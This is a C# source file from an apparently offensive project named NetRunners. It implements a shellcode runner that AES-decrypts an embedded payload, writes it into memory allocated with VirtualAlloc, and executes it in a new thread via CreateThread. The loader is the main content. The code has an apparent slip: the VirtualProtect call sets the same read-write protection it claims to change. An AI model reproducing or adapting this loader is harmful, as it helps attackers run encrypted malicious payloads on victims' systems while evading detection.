using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using static NetRunners.DecryptionAlgorithms.Decryptor;
using static NetRunners.Data.Delegates;
using static NetRunners.Data.Structures;
using static NetRunners.Data.EncryptedData;

namespace NetRunners.Runners
{
    /// <summary>
    /// This class contains the Basic Shellcode Runner.
    /// Retrieves encrypted payload from Shellcode class.
    /// Retrieves win32 apis from Win32APIs class, retrieves needed structures from Structures class.
    /// </summary>
    class Runner
    {
        static byte[] buf = Data.EncryptedData.buf;
        static int sBuf = Data.EncryptedData.sBuf;       // decrypted buf size
        // Basic Reflective Runner
        public static void Run()
        {
            try
            {
                // call virtual alloc to allocate memory space here
                IntPtr pMemory = VirtualAlloc(IntPtr.Zero, (UIntPtr)sBuf, 0x3000, PAGE_READWRITE);
                if (pMemory == IntPtr.Zero)
                    throw new InvalidOperationException($"VirtualAlloc failed with error code: {Marshal.GetLastWin32Error()} ");

                // try to decrypt buf
                try
                {
                    buf = DecryptBytesToBytes_Aes(buf, AesKey, AesIV);
                }
                catch (Exception e)
                {
                    throw new InvalidOperationException("Decryption of buffer failed.", e);
                }

                // copy shellcode to allocated memory
                Marshal.Copy(buf, 0, pMemory, sBuf);

                // change memory protection
                uint oldProtect;

                int bVP = VirtualProtect(pMemory, (UIntPtr)sBuf, PAGE_READWRITE, out oldProtect);
                if (bVP != 1) // not true
                {
                    throw new InvalidOperationException($"VirtualProtect failed with error code: {Marshal.GetLastWin32Error()}");
                }

                // execute shellcode
                IntPtr hThread = CreateThread(IntPtr.Zero, 0, pMemory, IntPtr.Zero, 0, IntPtr.Zero);
                if (hThread == IntPtr.Zero)
                    throw new InvalidOperationException($"CreateThread failed with error code: {Marshal.GetLastWin32Error()} ");

                // call wait function
                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
            catch (Exception e)
            {
                // handle error
                Console.WriteLine($"An error occurred: {e.Message}");
                throw;
            }
        }
    }
}
